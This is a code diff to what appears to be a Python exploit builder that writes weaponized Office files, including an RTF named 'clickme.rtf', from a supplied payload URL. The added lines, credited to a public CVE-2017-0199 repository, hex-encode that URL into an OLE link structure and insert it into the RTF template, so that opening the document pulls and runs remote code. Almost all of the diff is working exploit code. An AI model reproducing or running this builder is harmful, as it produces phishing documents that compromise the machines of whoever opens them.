@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 import argparse
 import os
 import zipfile
@@ -39,21 +38,25 @@ def generate_docx(payload_url):
 
     print(f"Generated '{const_docx_name}' in current directory")
 
-    
+#solution based on https://github.com/bhdresh/CVE-2017-0199    
 def generate_rtf(payload_url):
+    s = payload_url
+    docuri_hex = "00".join("{:02x}".format(ord(c)) for c in s)
+    docuri_pad_len = 224 - len(docuri_hex)
+    docuri_pad = "0"*docuri_pad_len
+    uri_hex = "010000020900000001000000000000000000000000000000a4000000e0c9ea79f9bace118c8200aa004ba90b8c000000"+docuri_hex+docuri_pad+"00000000795881f43b1d7f48af2c825dc485276300000000a5ab0000ffffffff0609020000000000c00000000000004600000000ffffffff0000000000000000906660a637b5d201000000000000000000000000000000000000000000000000100203000d0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
     const_rtf_name = "clickme.rtf"
 
     with open("src/rtf/clickme.rtf.tpl", "r") as f:
         tmp = f.read()
 
-    payload_rtf = tmp.replace('{payload_url}', payload_url) # cannot use format due to {} characters in RTF
+    payload_rtf = tmp.replace('{payload_url}', uri_hex) # cannot use format due to {} characters in RTF
 
     with open(const_rtf_name, "w") as f:
         f.write(payload_rtf)
 
     print(f"Generated '{const_rtf_name}' in current directory")    
 
-    
 if __name__ == "__main__":
 
     # Parse arguments
